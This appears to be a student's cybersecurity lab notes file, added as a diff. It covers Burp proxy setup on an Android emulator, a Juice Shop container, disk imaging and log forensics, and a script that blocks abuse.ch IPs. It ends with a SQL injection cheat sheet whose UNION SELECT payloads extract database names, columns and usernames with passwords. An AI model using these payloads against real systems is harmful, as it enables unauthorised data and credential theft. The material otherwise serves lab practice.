@@ -1,0 +1,120 @@
+// 1
+
+emulator
+emulator -list-avds
+emulator -avd <phone_name>
+adb devices
+adb shell settings put global http_proxy 10.0.2.2:8080
+adb shell settings get global http_proxy
+
+adb push burcper.cer /sdcard/Download/ 
+
+
+// 2
+
+docker run -d -p 8090:3000 --name juiceshop bkimminich/juice-shop
+ipconfig
+nmap -sV <your_ip>
+
+
+// 3
+
+echo "Cybersecurity Lab Evidence" > evidence.txt
+ls
+sudo apt install dc3dd
+lsblk
+dd if=/dev/zero of=practice_disk.dd bs=1M count=100
+mkfs.ext4 practice_disk.dd
+
+dc3dd if=/dev/sda1 of=/home/kali/image.dd hash=md5 log=acquisition.log.
+
+ls -lh /home/kali/practice_disk.dd
+cat /home/kali/acquisition.log
+
+sudo autopsy
+
+
+// 4
+
+cd /var/log 
+ls
+
+dpkg.log → package activity  
+apache2 → web server logs  
+nginx → web logs  
+journal → system logs (IMPORTANT)  
+wtmp, btmp
+
+last
+
+journalctl | less
+journalctl | grep "Failed"
+journalctl | grep ssh
+journalctl | grep -i error
+
+cd /var/log/apache2
+ls
+sudo less access.log
+grep "404" /var/log/apache2/access.log
+less /var/log/dpkg.log
+sudo journalctl -f
+
+sudo apt install openssh-server –y
+sudo service ssh start
+ip a
+ssh fakeuser@localhost or ssh kali@localhost
+journalctl | grep "Failed password"
+journalctl | grep "Failed password" | awk '{print $11}'
+journalctl | grep "Failed password" | awk '{print $11}' 
+| sort | uniq -c | sort -nr
+
+sudo lastb
+
+journalctl --since "10 minutes ago"
+
+
+// 5
+
+sudo apt install nodejs npm -y
+sudo npm install -g nativefier
+nativefier https://web.whatsapp.com
+cd WhatsAppWeb-linux-x64
+./WhatsAppWeb
+
+//firewall
+import requests, csv, subprocess 
+# source: Abuse CH 
+response = requests.get( 
+"https://feodotracker.abuse.ch/downloads/ipblocklist.csv" 
+).text 
+rule = 'netsh advfirewall firewall delete rule name="BadIP"' 
+subprocess.run(["PowerShell", "-Command", rule]) 
+mycsv = csv.reader( 
+filter(lambda x: not x.startswith("#"), response.splitlines()) 
+) 
+for row in mycsv: 
+ip = row[1] 
+if ip != "dst_ip": 
+print("Added Rule to block:", ip) 
+rule = "netsh advfirewall firewall add rule name='BadIP' Dir=Out Action=Block RemoteIP=" + ip 
+subprocess.run(["PowerShell", "-Command", rule]) 
+
+//
+SQL injection
+ALL user records
+1' OR '1'='1 
+Find Number of Columns 
+1' ORDER BY 1-- - 
+1' ORDER BY 2-- - 
+1' ORDER BY 3-- - 
+Union select
+1' UNION SELECT 1,2-- -
+Extract Database Name 
+1' UNION SELECT database(),2-- - 
+Extract Column Names 
+1' UNION SELECT column_name,2  
+FROM information_schema.columns  
+WHERE table_name='users'-- -
+ Extract Username & Password 
+1' UNION SELECT user,password FROM users-- -
+
